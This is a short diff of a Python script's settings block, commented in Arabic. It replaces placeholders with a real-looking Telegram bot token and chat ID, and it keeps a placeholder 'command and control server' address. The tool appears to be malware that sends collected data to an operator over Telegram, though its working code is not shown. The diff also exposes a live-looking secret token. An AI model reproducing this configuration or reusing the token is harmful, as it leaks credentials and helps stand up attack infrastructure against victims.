@@ -13,8 +13,8 @@ import glob
 import shutil
 
 # --- ضع معلوماتك هنا ---
-BOT_TOKEN = "ضع_التوكن_هنا"  # توكن البوت الخاص بك
-CHAT_ID = "ضع_الايدي_هنا"    # ايدي المحادثة
+BOT_TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY"
+CHAT_ID = "7259620384"# ايدي المحادثة
 C2_SERVER = "http://your-server.com"  # سيرفر القيادة والتحكم (اختياري)
 # -----------------------
 
